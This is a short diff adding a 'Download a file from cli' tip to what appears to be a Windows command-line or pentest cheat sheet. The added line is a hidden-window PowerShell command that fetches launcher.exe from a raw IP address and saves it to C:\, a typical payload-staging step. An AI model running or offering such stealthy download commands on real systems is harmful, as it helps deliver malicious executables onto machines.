@@ -30,3 +30,11 @@ Run an application in a shell without graphical interface if message `this progr
 cmd> runas /user:<username> app.exe
 ```
 
+### Download a file from cli
+
+Requirements
+- powershell installed
+
+```cmd
+powershell.exe -nop -w hidden -c "$client = new-object System.Net.WebClient;$client.DownloadFile('http://175.12.80.10:8000/launcher.exe','C:\launcher.exe')"
+```
